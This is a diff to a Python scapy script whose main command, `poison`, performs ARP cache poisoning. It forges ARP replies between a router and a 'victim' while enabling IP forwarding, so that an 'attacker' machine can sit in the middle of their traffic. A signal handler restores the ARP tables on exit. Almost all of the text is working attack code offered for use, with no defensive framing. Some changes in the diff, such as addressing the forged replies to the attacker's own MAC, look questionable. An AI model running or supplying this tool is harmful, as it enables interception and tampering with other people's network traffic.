@@ -1,57 +1,41 @@
 #!/usr/bin/env python
 
 
-import os
-import sys
 import argh
 import time
+import utils
 import signal
-
+import logging
 from scapy.all import *
 
 
-def originalMAC(ip):
-    ans, unans = srp(ARP(pdst=ip), timeout=5, retry=3)
-    for s, r in ans:
-        return r[Ether].src
+def _arp_registered_MAC(ip, interface=Ether):
+    return srp(ARP(pdst=ip), timeout=5, retry=3)[0][1][interface].src
 
 
-def assure_root(fn):
-    def wrapper(*args, **kwargs):
-        if not os.geteuid() == 0:
-            sys.exit("\nOnly root can run this script\n")
-        return fn(*args, **kwargs)
-    return wrapper
+def poison(routerIP, victimIP, attackerIP, interface='eth0'):
+    routerMAC = _arp_registered_MAC(routerIP)
+    victimMAC = _arp_registered_MAC(victimIP)
+    attackerMAC = _arp_registered_MAC(attackerIP)
+    if not routerMAC or not victimMAC or not attackerMAC:
+        logging.error('''Could not determine all parties MACs:\n
+                      \t router   IP: {rip} \t MAC: {rmac} \n
+                      \t victim   IP: {vip} \t MAC: {vmac} \n
+                      \t attacker IP: {aip} \t MAC: {amac} \n
+                      '''.format(rip=routerIP, rmac=routerMAC,
+                                 vip=victimIP, vmac=victimMAC,
+                                 aip=attackerIP, amac=attackerMAC))
+        return
 
-
-class Syscfg(object):
-
-    def __init__(self, filepath, value):
-        self._filepath = filepath
-        self._new_value = value
-
-    @assure_root
-    def __enter__(self):
-        with open(self._filepath, 'r') as f:
-            self._old_value = f.read()
-        with open(self._filepath, 'w') as f:
-            f.write('1\n')
-
-    def __exit__(self):
-        with open(self._filepath, 'w') as f:
-            f.write(self._old_value)
-
-
-def poison(routerIP, routerMAC, victimIP, victimMAC):
     def _signal_handler(signal, frame):
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC))
+        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC))
 
-    with Syscfg('/proc/sys/net/ipv4/ip_forward', '1\n'):
+    with utils.ip_forwarding():
         signal.signal(signal.SIGINT, _signal_handler)
         while True:
-            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=attackerMAC, hwsrc=victimMAC), count=3)
+            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=attackerMAC, hwsrc=routerMAC), count=3)
             time.sleep(2)
 
 
@@ -68,4 +52,5 @@ def display():
 
 
 if __name__ == '__main__':
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
     argh.dispatch_commands([poison, verify, monitor, display])
